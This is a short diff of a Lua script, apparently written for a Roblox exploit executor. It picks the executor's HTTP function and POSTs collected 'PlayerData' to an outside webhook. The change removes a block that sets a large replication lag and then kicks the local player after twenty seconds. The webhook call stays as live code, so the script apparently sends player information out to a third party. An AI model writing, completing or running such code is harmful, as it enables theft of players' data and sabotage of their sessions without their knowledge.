@@ -36,11 +36,5 @@ local HttpRequest = http_request
 if syn then
     HttpRequest = syn.request
 end
-settings():GetService("NetworkSettings").IncomingReplicationLag = "10000"
-local player = game.Players.LocalPlayer
-local function kickPlayer()
-    player:Kick()
-end
-wait(20)
-kickPlayer()
 HttpRequest({Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers})
+
